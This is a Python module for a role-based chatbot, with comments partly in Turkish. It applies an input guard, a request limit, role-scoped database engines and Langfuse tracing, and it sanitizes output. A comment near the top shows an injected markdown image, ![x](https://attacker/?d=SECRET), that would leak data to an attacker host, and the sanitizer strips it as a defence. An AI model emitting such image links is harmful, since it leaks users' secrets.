import re
from dataclasses import dataclass, field

from langfuse import get_client, observe, propagate_attributes
from pydantic_ai import UsageLimitExceeded, UsageLimits
from pydantic_ai.messages import ModelMessage, ToolCallPart
from sqlalchemy import Engine

from rolchat.agent import agent
from rolchat.guard import check_input
from rolchat.models import ROLE_LEVELS
from rolchat.policy import allowed_tools
from rolchat.tools import Deps

REFUSAL = "Bu konuda bilgim yok."
# Unbounded consumption (OWASP LLM10): a runaway tool loop stops after a few model requests.
USAGE_LIMITS = UsageLimits(request_limit=5)

# Improper output handling (OWASP LLM05): a markdown image is loaded by the browser on its own, so an
# injected ![x](https://attacker/?d=SECRET) would leak data. Drop images, keep only the text of links.
_DEST = r"\((?:[^()]|\([^()]*\))*\)"  # (url), allowing one level of nested parentheses
_IMAGE = re.compile(r"!\[[\s\S]*?\](?:" + _DEST + r"|\[[^\]]*\])")
_LINK = re.compile(r"\[([^\]]*)\]" + _DEST)
_REF_DEF = re.compile(r"^ {0,3}\[[^\]]+\]:.*$", re.MULTILINE)


def sanitize(text: str) -> str:
    return _REF_DEF.sub("", _LINK.sub(r"\1", _IMAGE.sub("", text)))


@dataclass
class Reply:
    text: str
    history: list[ModelMessage]
    blocked_by: str | None = None
    tools_offered: list[str] = field(default_factory=list)
    tools_called: list[str] = field(default_factory=list)


@observe(name="chat", capture_input=False, capture_output=False)
async def answer(
    text: str,
    role: str,
    history: list[ModelMessage],
    engines: dict[int, Engine],
    guard=check_input,
    session_id: str | None = None,
) -> Reply:
    # Everything under this trace (guardrail, LLM calls, tool calls) is tagged with the role.
    with propagate_attributes(user_id=role, session_id=session_id, tags=[f"rol:{role}"]):
        reply = await _answer(text, role, history, engines, guard)
    reply.text = sanitize(reply.text)
    langfuse = get_client()
    langfuse.update_current_span(
        input=text,
        output=reply.text,
        metadata={"blocked_by": reply.blocked_by, "tools_called": reply.tools_called},
    )
    langfuse.score_current_trace(name="guardrail_blocked", value=1 if reply.blocked_by else 0)
    return reply


async def _answer(text, role, history, engines, guard) -> Reply:
    blocked_by = await guard(text)
    if blocked_by:
        return Reply(text=REFUSAL, history=history, blocked_by=blocked_by)

    try:
        result = await agent.run(
            text,
            # Third layer: the database user of the role's level cannot read higher-level tables.
            deps=Deps(role=role, engine=engines[ROLE_LEVELS[role]]),
            message_history=history,
            usage_limits=USAGE_LIMITS,
        )
    except UsageLimitExceeded:
        return Reply(text=REFUSAL, history=history, tools_offered=sorted(allowed_tools(role)))
    called = [
        part.tool_name
        for msg in result.new_messages()
        for part in msg.parts
        if isinstance(part, ToolCallPart)
    ]
    return Reply(
        text=result.output,
        history=result.all_messages(),
        tools_offered=sorted(allowed_tools(role)),
        tools_called=called,
    )


def decision_panel(reply: Reply, role: str) -> str:
    guard = f"engellendi (`{reply.blocked_by}`)" if reply.blocked_by else "geçti"
    return "\n".join([
        f"**Rol:** `{role}`",
        f"**Guardrail:** {guard}",
        f"**Modele verilen araçlar:** {', '.join(f'`{t}`' for t in reply.tools_offered) or '-'}",
        f"**Çağrılan araçlar:** {', '.join(f'`{t}`' for t in reply.tools_called) or '-'}",
    ])
